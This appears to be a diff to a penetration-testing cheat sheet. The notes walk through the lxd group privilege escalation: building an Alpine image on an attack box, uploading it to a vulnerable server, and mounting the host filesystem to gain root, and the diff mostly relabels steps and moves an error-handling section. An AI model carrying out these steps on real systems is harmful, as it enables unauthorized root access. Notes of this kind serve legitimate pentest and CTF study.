@@ -87,7 +87,7 @@ docker run -it ubuntu bash
 - Optional: Run an ubuntu container with docker
 ### lxd Group Priv Esc
 - Exploit without internet connection
-- Change to the root user
+- Change to the root user on attack box
 ```
 sudo su
 ```
@@ -96,33 +96,27 @@ sudo su
 sudo apt update
 sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
 ```
-- Clone the repo
+- Clone the repo (attack box)
 ```
 sudo go get -d -v github.com/lxc/distrobuilder
 ```
-- Make distrobuilder
+- Make distrobuilder (attack box)
 ```
 cd $HOME/go/src/github.com/lxc/distrobuilder
 make
 ```
-- Prepare the creation of Alpine
+- Prepare the creation of Alpine (attack box)
 ```
 mkdir -p $HOME/ContainerImages/alpine/
 cd $HOME/ContainerImages/alpine/
 wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 ```
-- Create the container
+- Create the container (attack box)
 ```
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
 ```
 -If that fails, run it adding `-o image.release=3.8` at the end
-- Errors
-- If you recieve an `Failed container creation: No storage pool found. Please create a new storage pool.`
-- You need to initialize lxd before using it
-```
-lxd init
-```
-- Read the options and use the defaults
+
 - Upload `lxd.tar.xz` and `rootfs.squashfs` to the vulnerable server
 - Add the image on the vulnerable server
 ```
@@ -142,5 +136,11 @@ lxc exec privesc /bin/sh
 cd /mnt/root
 ```
 - `/mnt/root` is where the file system is mounted.
-
+- Errors (on the vulnerable server)
+- If you recieve an `Failed container creation: No storage pool found. Please create a new storage pool.`
+- You need to initialize lxd before using it
+```
+lxd init
+```
+- Read the options and use the defaults
 
